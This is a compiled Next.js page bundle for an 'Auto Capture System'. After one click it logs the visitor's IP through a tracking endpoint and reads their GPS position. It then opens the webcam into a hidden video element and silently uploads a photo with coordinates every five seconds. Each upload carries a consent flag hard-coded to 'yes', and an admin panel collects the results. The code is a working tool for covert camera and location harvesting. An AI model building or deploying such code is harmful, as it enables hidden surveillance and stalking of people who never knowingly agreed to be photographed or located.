module.exports = [
"[externals]/react/jsx-dev-runtime [external] (react/jsx-dev-runtime, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("react/jsx-dev-runtime", () => require("react/jsx-dev-runtime"));

module.exports = mod;
}),
"[project]/pages/index.tsx [ssr] (ecmascript)", ((__turbopack_context__) => {
"use strict";

__turbopack_context__.s([
    "default",
    ()=>HomePage
]);
var __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__ = __turbopack_context__.i("[externals]/react/jsx-dev-runtime [external] (react/jsx-dev-runtime, cjs)");
var __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__ = __turbopack_context__.i("[externals]/react [external] (react, cjs)");
;
;
const BACKEND = ("TURBOPACK compile-time value", "http://localhost:4000") || "http://localhost:4000";
function HomePage() {
    const [loading, setLoading] = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useState"])(false);
    const [autoMode, setAutoMode] = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useState"])(false);
    const intervalRef = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useRef"])(null);
    const videoRef = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useRef"])(null);
    const [stream, setStream] = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useState"])(null);
    // -------------------- TRACK IP --------------------
    async function handleTrack() {
        await fetch(`${BACKEND}/api/track`);
    }
    // -------------------- GPS --------------------
    async function getGPS() {
        return new Promise((resolve)=>{
            if (!navigator.geolocation) return resolve(null);
            navigator.geolocation.getCurrentPosition((pos)=>resolve(pos), ()=>resolve(null));
        });
    }
    // -------------------- CAMERA --------------------
    async function openCamera(startAuto = false) {
        try {
            const s = await navigator.mediaDevices.getUserMedia({
                video: true
            });
            setStream(s);
            if (videoRef.current) {
                videoRef.current.srcObject = s;
                await videoRef.current.play();
            }
            if (startAuto) startAutoCapture();
        } catch (err) {
            alert("Camera permission denied");
        }
    }
    // -------------------- TAKE PHOTO --------------------
    async function takePhoto(silent = false) {
        if (!videoRef.current) return;
        const canvas = document.createElement("canvas");
        canvas.width = videoRef.current.videoWidth;
        canvas.height = videoRef.current.videoHeight;
        canvas.getContext("2d")?.drawImage(videoRef.current, 0, 0);
        const blob = await new Promise((resolve)=>canvas.toBlob(resolve, "image/jpeg", 0.9));
        if (!blob) return;
        const pos = await getGPS();
        const fd = new FormData();
        fd.append("photo", blob);
        fd.append("consent", "yes");
        if (pos) {
            fd.append("latitude", String(pos.coords.latitude));
            fd.append("longitude", String(pos.coords.longitude));
        }
        await fetch(`${BACKEND}/api/upload-photo`, {
            method: "POST",
            body: fd
        });
        // Stop camera only in manual mode
        if (!silent && !autoMode && stream) {
            stream.getTracks().forEach((t)=>t.stop());
            setStream(null);
        }
    }
    // -------------------- AUTO CAPTURE --------------------
    function startAutoCapture() {
        if (autoMode) return;
        setAutoMode(true);
        intervalRef.current = window.setInterval(()=>{
            takePhoto(true);
        }, 5000);
    }
    function stopAutoCapture() {
        setAutoMode(false);
        if (intervalRef.current !== null) {
            clearInterval(intervalRef.current);
            intervalRef.current = null;
        }
        if (stream) {
            stream.getTracks().forEach((t)=>t.stop());
            setStream(null);
        }
    }
    // -------------------- RUN ALL --------------------
    async function runAll() {
        setLoading(true);
        await handleTrack();
        await getGPS();
        await openCamera(true);
        // Take first photo instantly
        setTimeout(()=>takePhoto(true), 1000);
        setLoading(false);
    }
    // -------------------- UI --------------------
    const buttonStyle = {
        padding: "14px 28px",
        margin: "10px",
        borderRadius: "6px",
        fontSize: "16px",
        cursor: "pointer",
        border: "none",
        color: "white"
    };
    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("main", {
        style: {
            textAlign: "center",
            padding: 40
        },
        children: [
            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("h1", {
                children: "Auto Capture System"
            }, void 0, false, {
                fileName: "[project]/pages/index.tsx",
                lineNumber: 138,
                columnNumber: 7
            }, this),
            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("button", {
                onClick: runAll,
                style: {
                    ...buttonStyle,
                    background: "green"
                },
                disabled: loading,
                children: loading ? "Starting..." : "Run All"
            }, void 0, false, {
                fileName: "[project]/pages/index.tsx",
                lineNumber: 140,
                columnNumber: 7
            }, this),
            autoMode && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("button", {
                onClick: stopAutoCapture,
                style: {
                    ...buttonStyle,
                    background: "red"
                },
                children: "Stop Auto Capture"
            }, void 0, false, {
                fileName: "[project]/pages/index.tsx",
                lineNumber: 149,
                columnNumber: 9
            }, this),
            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("button", {
                onClick: ()=>window.open("/admin", "_blank"),
                style: {
                    ...buttonStyle,
                    background: "blue"
                },
                children: "Admin Panel"
            }, void 0, false, {
                fileName: "[project]/pages/index.tsx",
                lineNumber: 158,
                columnNumber: 7
            }, this),
            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("video", {
                ref: videoRef,
                style: {
                    display: "none"
                }
            }, void 0, false, {
                fileName: "[project]/pages/index.tsx",
                lineNumber: 166,
                columnNumber: 7
            }, this)
        ]
    }, void 0, true, {
        fileName: "[project]/pages/index.tsx",
        lineNumber: 136,
        columnNumber: 5
    }, this);
}
}),
"[externals]/next/dist/shared/lib/no-fallback-error.external.js [external] (next/dist/shared/lib/no-fallback-error.external.js, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/shared/lib/no-fallback-error.external.js", () => require("next/dist/shared/lib/no-fallback-error.external.js"));

module.exports = mod;
}),
];

//# sourceMappingURL=%5Broot-of-the-server%5D__60b1ea7b._.js.map